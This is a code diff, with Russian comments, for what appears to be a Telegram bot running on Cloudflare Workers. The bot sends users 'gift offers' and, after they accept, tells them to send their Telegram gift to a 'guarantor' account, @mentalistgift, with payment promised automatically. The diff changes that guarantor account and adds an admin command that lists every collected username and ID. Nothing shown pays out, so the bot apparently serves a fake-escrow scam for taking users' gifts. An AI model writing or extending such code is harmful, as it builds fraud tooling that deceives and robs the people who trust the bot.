@@ -1,6 +1,6 @@
-const ADMIN_ID_1 = 5151757168; 
+const ADMIN_ID = 5151757168; 
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
-const RELAYER_USERNAME = "GarisOfferRelayer"; 
+const RELAYER_USERNAME = "mentalistgift"; // ИЗМЕНЕНО НА @mentalistgift
 
 export default {
   async fetch(request, env, ctx) {
@@ -17,13 +17,68 @@ export default {
     try {
       const update = await request.json();
 
+      // ==========================================
+      // КОМАНДА /stats (ТОЛЬКО ДЛЯ АДМИНА)
+      // ==========================================
+      if (update.message && update.message.text === "/stats") {
+        const senderId = update.message.from.id;
+        const chatId = update.message.chat.id;
+
+        if (senderId !== ADMIN_ID) {
+            await callApi("sendMessage", { chat_id: chatId, text: "⛔ У вас нет прав." }, BOT_TOKEN);
+            return new Response("OK", { status: 200 });
+        }
+
+        if (!kv) {
+            await callApi("sendMessage", { chat_id: chatId, text: "❌ База данных KV не подключена." }, BOT_TOKEN);
+            return new Response("OK", { status: 200 });
+        }
+
+        try {
+            let cursor = undefined;
+            let usersList = [];
+            let activeOffers = 0;
+
+            do {
+                const list = await kv.list({ cursor });
+                for (const key of list.keys) {
+                    if (key.name.startsWith("user:")) {
+                        const username = await kv.get(key.name);
+                        const userId = key.name.replace("user:", "");
+                        usersList.push(`@${username} (${userId})`);
+                    }
+                    if (key.name.startsWith("offer:")) {
+                        activeOffers++;
+                    }
+                }
+                cursor = list.cursor;
+            } while (cursor);
+
+            let statsText = `📊 <b>Статистика бота:</b>\n\n`;
+            statsText += `👥 <b>Всего пользователей:</b> ${usersList.length}\n`;
+            statsText += `📦 <b>Активных офферов:</b> ${activeOffers}\n\n`;
+            
+            if (usersList.length > 0) {
+                statsText += `📋 <b>Список пользователей:</b>\n`;
+                statsText += usersList.join("\n");
+            } else {
+                statsText += `— Пользователей пока нет —`;
+            }
+
+            await callApi("sendMessage", { chat_id: chatId, text: statsText, parse_mode: "HTML" }, BOT_TOKEN);
+        } catch (err) {
+            await callApi("sendMessage", { chat_id: chatId, text: `❌ Ошибка при получении статистики: ${err.message}` }, BOT_TOKEN);
+        }
+        return new Response("OK", { status: 200 });
+      }
+
       // --- /start ---
       if (update.message && update.message.text === "/start") {
         const chatId = update.message.chat.id;
         const userId = update.message.from.id;
-        const username = update.message.from.username;
+        const username = update.message.from.username || "no_username";
 
-        if (kv) await kv.put(`user:${userId}`, username || "no_username");
+        if (kv) await kv.put(`user:${userId}`, username);
 
         const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту.\n4. Оплата приходит автоматически.`;
         
@@ -67,6 +122,7 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
         
+        // ГАРАНТ ТЕПЕРЬ @mentalistgift
         const targetReceiver = RELAYER_USERNAME;
 
         let text = "";
@@ -74,7 +130,6 @@ export default {
         let btnDecline = "Отклонить";
         let titleText = "";
 
-        // Минималистичный текст
         if (lang === "en") {
             text = `<b>Gift Offer</b>\n\nYou are offered <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
             btnAccept = "Accept";
@@ -160,12 +215,10 @@ export default {
           let newMarkup = { inline_keyboard: [] };
 
           if (action === "acc") {
-            // ПРОСТОЕ ОКНО
             await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: `Оффер принят ✅`, show_alert: true }, BOT_TOKEN);
             
             const finalUrl = "https://t.me/" + targetReceiver;
 
-            // МИНИМАЛИСТИЧНЫЙ ТЕКСТ ПОСЛЕ ПРИНЯТИЯ
             if (lang === "en") {
                 newText = `✅ <b>Accepted</b>\n\nTo receive <b>${amount} ${displayCurrency}</b>, send the gift to:\n\n‼️ <b>Important:</b> send the gift exactly to the guarantor <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
                 newMarkup = { inline_keyboard: [[{ text: "Send Gift", url: finalUrl }]] };
